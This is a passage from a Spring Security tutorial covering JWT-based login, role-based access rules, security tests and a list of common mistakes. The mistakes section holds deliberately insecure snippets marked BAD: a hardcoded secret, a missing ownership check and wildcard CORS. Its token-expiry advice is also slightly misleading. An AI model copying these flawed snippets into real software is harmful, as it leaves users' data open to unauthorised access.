        http
            // Disable CSRF for stateless API
            .csrf(csrf -> csrf.disable())
            
            // CORS configuration
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            
            // Exception handling
            .exceptionHandling(exception -> exception
                .authenticationEntryPoint(authEntryPoint)      // 401
                .accessDeniedHandler(accessDeniedHandler)      // 403
            )
            
            // Stateless session
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            
            // URL authorization
            .authorizeHttpRequests(auth -> auth
                // Public endpoints
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/actuator/health").permitAll()
                
                // Swagger UI (if used)
                .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").permitAll()
                
                // Admin endpoints
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                
                // Everything else requires authentication
                .anyRequest().authenticated()
            )
            
            // Authentication provider
            .authenticationProvider(authenticationProvider)
            
            // JWT filter
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public AuthenticationProvider authenticationProvider(
            UserDetailsService userDetailsService,
            PasswordEncoder passwordEncoder) {
        DaoAuthenticationProvider authProvider = new DaoAuthenticationProvider();
        authProvider.setUserDetailsService(userDetailsService);
        authProvider.setPasswordEncoder(passwordEncoder);
        return authProvider;
    }

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(Arrays.asList("http://localhost:3000"));
        configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        configuration.setAllowedHeaders(Arrays.asList("Authorization", "Content-Type"));
        configuration.setAllowCredentials(true);
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

### 8.2 Custom Exception Handlers

```java
@Component
public class CustomAuthenticationEntryPoint implements AuthenticationEntryPoint {
    
    @Override
    public void commence(HttpServletRequest request, HttpServletResponse response,
                         AuthenticationException authException) throws IOException {
        response.setContentType("application/json");
        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
        response.getWriter().write("""
            {
                "success": false,
                "error": "Unauthorized",
                "message": "Authentication required to access this resource"
            }
            """);
    }
}

@Component
public class CustomAccessDeniedHandler implements AccessDeniedHandler {
    
    @Override
    public void handle(HttpServletRequest request, HttpServletResponse response,
                       AccessDeniedException accessDeniedException) throws IOException {
        response.setContentType("application/json");
        response.setStatus(HttpServletResponse.SC_FORBIDDEN);
        response.getWriter().write("""
            {
                "success": false,
                "error": "Forbidden",
                "message": "You don't have permission to access this resource"
            }
            """);
    }
}
```

### 8.3 Auth Controller Implementation

```java
@RestController
@RequestMapping("/api/auth")
@RequiredArgsConstructor
public class AuthController {

    private final AuthenticationManager authenticationManager;
    private final UserRepository userRepository;
    private final PasswordEncoder passwordEncoder;
    private final JwtTokenProvider tokenProvider;

    @PostMapping("/register")
    public ResponseEntity<?> register(@Valid @RequestBody RegisterRequest request) {
        // Check if username exists
        if (userRepository.existsByUsername(request.getUsername())) {
            return ResponseEntity.badRequest()
                .body(new ErrorResponse("Username already taken"));
        }

        // Check if email exists
        if (userRepository.existsByEmail(request.getEmail())) {
            return ResponseEntity.badRequest()
                .body(new ErrorResponse("Email already registered"));
        }

        // Create user
        User user = new User();
        user.setUsername(request.getUsername());
        user.setEmail(request.getEmail());
        user.setPassword(passwordEncoder.encode(request.getPassword()));
        user.setRole(Role.USER);

        User savedUser = userRepository.save(user);

        return ResponseEntity.status(HttpStatus.CREATED)
            .body(new SuccessResponse<>("User registered successfully", 
                new UserResponse(savedUser)));
    }

    @PostMapping("/login")
    public ResponseEntity<?> login(@Valid @RequestBody LoginRequest request) {
        try {
            Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    request.getUsername(),
                    request.getPassword()
                )
            );

            SecurityContextHolder.getContext().setAuthentication(authentication);
            User user = (User) authentication.getPrincipal();
            
            String accessToken = tokenProvider.generateAccessToken(user);
            String refreshToken = tokenProvider.generateRefreshToken(user);

            return ResponseEntity.ok(new AuthResponse(accessToken, refreshToken, "Bearer", 86400));
        } catch (BadCredentialsException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(new ErrorResponse("Invalid username or password"));
        }
    }

    @GetMapping("/me")
    public ResponseEntity<?> getCurrentUser(@AuthenticationPrincipal User user) {
        return ResponseEntity.ok(new UserResponse(user));
    }
}
```

---

## 9. Security Testing

### 9.1 Unit Tests for Security

```java
@WebMvcTest(DocumentController.class)
class DocumentControllerSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @MockBean
    private DocumentService documentService;

    @Test
    void whenUnauthenticated_thenReturn401() throws Exception {
        mockMvc.perform(get("/api/documents"))
            .andExpect(status().isUnauthorized());
    }

    @Test
    @WithMockUser(roles = "USER")
    void whenAuthenticated_thenReturn200() throws Exception {
        when(documentService.getAll()).thenReturn(Collections.emptyList());
        
        mockMvc.perform(get("/api/documents"))
            .andExpect(status().isOk());
    }

    @Test
    @WithMockUser(roles = "USER")
    void whenUserAccessesAdminEndpoint_thenReturn403() throws Exception {
        mockMvc.perform(get("/api/documents/admin/all"))
            .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(roles = "ADMIN")
    void whenAdminAccessesAdminEndpoint_thenReturn200() throws Exception {
        when(documentService.getAllForAdmin()).thenReturn(Collections.emptyList());
        
        mockMvc.perform(get("/api/documents/admin/all"))
            .andExpect(status().isOk());
    }
}
```

### 9.2 Integration Tests

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@AutoConfigureMockMvc
class AuthIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @Test
    void fullAuthenticationFlow() throws Exception {
        // 1. Register
        RegisterRequest registerRequest = new RegisterRequest("testuser", "test@example.com", "SecurePass123!");
        
        mockMvc.perform(post("/api/auth/register")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(registerRequest)))
            .andExpect(status().isCreated());

        // 2. Login
        LoginRequest loginRequest = new LoginRequest("testuser", "SecurePass123!");
        
        MvcResult result = mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(loginRequest)))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.accessToken").exists())
            .andReturn();

        String responseBody = result.getResponse().getContentAsString();
        String token = objectMapper.readTree(responseBody).get("accessToken").asText();

        // 3. Access protected resource
        mockMvc.perform(get("/api/documents")
                .header("Authorization", "Bearer " + token))
            .andExpect(status().isOk());
    }

    @Test
    void wrongPassword_returns401() throws Exception {
        LoginRequest loginRequest = new LoginRequest("testuser", "WrongPassword");
        
        mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(loginRequest)))
            .andExpect(status().isUnauthorized());
    }
}
```

### 9.3 Manual Testing with cURL

```bash
# Register a new user
curl -X POST http://localhost:8080/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"john","email":"john@example.com","password":"SecurePass123!"}'

# Login
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"SecurePass123!"}'

# Access protected endpoint (replace TOKEN with actual token)
curl -X GET http://localhost:8080/api/documents \
  -H "Authorization: Bearer TOKEN"

# Test unauthorized access
curl -X GET http://localhost:8080/api/documents
# Should return 401

# Test forbidden access (as regular user to admin endpoint)
curl -X GET http://localhost:8080/api/documents/admin/all \
  -H "Authorization: Bearer USER_TOKEN"
# Should return 403
```

---

## 10. Common Mistakes to Avoid

### ❌ Mistake 1: Hardcoding Secrets

```java
// ❌ BAD
private static final String JWT_SECRET = "mySecretKey123";

// ✅ GOOD - Use environment variables
@Value("${jwt.secret}")
private String jwtSecret;
```

### ❌ Mistake 2: Weak Password Validation

```java
// ❌ BAD - No validation
user.setPassword(passwordEncoder.encode(request.getPassword()));

// ✅ GOOD - Validate password strength
public class RegisterRequest {
    @NotBlank
    @Size(min = 8, message = "Password must be at least 8 characters")
    @Pattern(regexp = "^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%^&+=!]).*$",
             message = "Password must contain digit, lowercase, uppercase, and special character")
    private String password;
}
```

### ❌ Mistake 3: Exposing Sensitive Information

```java
// ❌ BAD - Leaks information
@ExceptionHandler(UsernameNotFoundException.class)
public ResponseEntity<?> handleUserNotFound(UsernameNotFoundException ex) {
    return ResponseEntity.status(401).body("User does not exist"); // Attacker knows username is wrong
}

// ✅ GOOD - Generic message
@ExceptionHandler({UsernameNotFoundException.class, BadCredentialsException.class})
public ResponseEntity<?> handleAuthError(Exception ex) {
    return ResponseEntity.status(401).body("Invalid credentials"); // No hint about what's wrong
}
```

### ❌ Mistake 4: Not Validating Token Expiry

```java
// ❌ BAD - Just checking signature
public boolean validateToken(String token) {
    try {
        Jwts.parser().setSigningKey(key).parseClaimsJws(token);
        return true;
    } catch (Exception e) {
        return false;
    }
}

// ✅ GOOD - Check expiry explicitly
public boolean validateToken(String token) {
    try {
        Claims claims = Jwts.parser().setSigningKey(key).parseClaimsJws(token).getBody();
        return !claims.getExpiration().before(new Date());
    } catch (ExpiredJwtException e) {
        log.warn("Token expired");
        return false;
    } catch (Exception e) {
        return false;
    }
}
```

### ❌ Mistake 5: Forgetting Authorization Checks

```java
// ❌ BAD - Only checks authentication, not authorization
@GetMapping("/documents/{id}")
public Document getDocument(@PathVariable Long id) {
    return documentRepository.findById(id).orElseThrow();
    // Any authenticated user can access ANY document!
}

// ✅ GOOD - Check authorization
@GetMapping("/documents/{id}")
public Document getDocument(@PathVariable Long id, @AuthenticationPrincipal User user) {
    Document doc = documentRepository.findById(id).orElseThrow();
    if (!doc.getOwner().equals(user) && doc.getVisibility() != Visibility.PUBLIC) {
        throw new AccessDeniedException("Cannot access this document");
    }
    return doc;
}
```

### ❌ Mistake 6: Using HTTP Instead of HTTPS

```yaml
# application-prod.yml
server:
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${KEYSTORE_PASSWORD}
    key-store-type: PKCS12
```

### ❌ Mistake 7: Not Handling CORS Properly

```java
// ❌ BAD - Allows everything
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**").allowedOrigins("*"); // DANGEROUS!
    }
}

// ✅ GOOD - Specific origins
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://myapp.com", "https://admin.myapp.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("Authorization", "Content-Type")
            .allowCredentials(true);
    }
}
```

---

## 🎯 Next Steps

Now that you have the foundation, here's your learning path:

1. **Complete the Security Challenge** - Your `security-challenge/` folder has a ready-to-implement project
2. **Implement Basic Auth** - Start with username/password authentication
3. **Add JWT** - Implement token-based authentication
4. **Add Authorization** - Implement role and permission-based access control
5. **Security Testing** - Write tests for all security scenarios
6. **Advanced Topics** - OAuth2, API Keys, Rate Limiting, Audit Logging

### Useful Resources

- [Spring Security Documentation](https://docs.spring.io/spring-security/reference/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT.io](https://jwt.io/) - Debug and decode JWT tokens
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

**Happy Securing! 🔐**

